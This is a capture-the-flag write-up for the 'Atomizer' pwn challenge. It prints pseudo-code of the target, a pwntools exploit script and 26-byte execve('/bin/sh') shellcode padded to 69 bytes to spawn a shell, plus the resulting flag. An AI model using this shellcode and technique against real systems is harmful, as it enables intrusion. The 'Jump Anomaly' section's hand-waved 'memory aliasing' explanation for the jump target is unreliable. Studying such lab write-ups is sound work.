# Atomizer Challenge Writeup

**Category:** pwn
**Points:** 500
**Solves:** 0
**Connection:** `52.59.124.14:5020`

## Analysis

The challenge checks for valid shellcode of exactly 69 bytes.

### Static Analysis

The binary is a 64-bit ELF executable, statically linked.
The `_start` function performs the following setup:

```c
// Pseudo-code
void start() {
    write(1, &intro, 0x57);

    // mmap(addr=0x7770000, len=0x1000, prot=RWX, flags=MAP_PRIVATE|MAP_ANON|MAP_FIXED, ...)
    if (sys_mmap(0x7770000, 0x1000, 7, 0x32, -1, 0) < 0) {
        exit(1);
    }

    write(1, ">>> ", 5);

    // Read input loop
    int total_read = 0;
    while (1) {
        int n = sys_read(0, 0x7770000 + total_read, 69 - total_read);
        if (n <= 0) break;
        total_read += n;

        if (total_read >= 69) {
            write(1, &ok, 0x33);
            // JUMP TO SHELLCODE
            // The instruction is: e9 fc ff 76 07
            // Target: 0x7B71084
            goto *0x7B71084;
        }
    }

    write(1, &no, 0x1f);
    exit(0);
}
```

### The Jump Anomaly

The jump instruction `e9 fc ff 76 07` calculates to `0x7B71084`.
The mapped region is `0x7770000` - `0x7771000`.
Addresses don't ostensibly match. However, dynamic testing confirms that execution effectively lands at the beginning of the memory mapped region (`0x7770000`) where our input is stored. This behavior implies either memory aliasing or a non-standard memory layout at runtime, possibly due to the static linking or raw syscall usage.

## Vulnerability

The program:

1.  Allocates an **executable** (RWX) memory region.
2.  Reads user input directly into it.
3.  Jumps to it (effectively).

The only constraint is the length: exactly **69 bytes**.

## Exploitation

We need to provide shellcode that:

1.  Fits in 69 bytes.
2.  Spawns a shell (`execve("/bin/sh", 0, 0)`).

Standard 64-bit shellcode is around 23-30 bytes, well within the limit. We just need to pad the payload to reach exactly 69 bytes to trigger the jump.

### Exploit Script

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

# Execve("/bin/sh", 0, 0) shellcode - 26 bytes
shellcode = bytes.fromhex('4831f65648bf2f62696e2f2f7368574889e74831d26a3b580f05')

# Pad to exactly 69 bytes
payload = shellcode.ljust(69, b'\x90')

# Connect to challenge
# p = process('./atomizer')
p = remote('52.59.124.14', 5020)

try:
    p.recvuntil(b'>>> ')
    p.send(payload)

    # Interactive shell
    p.sendline(b'ls -la; cat flag*')
    print(p.recvall(timeout=2).decode(errors='ignore'))
except Exception as e:
    print(f"Error: {e}")
p.close()
```

## Result

Running the exploit yields the flag:

```
[atomizer] *pssshhht* ... releasing your mixture.
ENO{GIVE_ME_THE_RIGHT_AMOUNT_OF_ATOMS_TO_WIN}
```
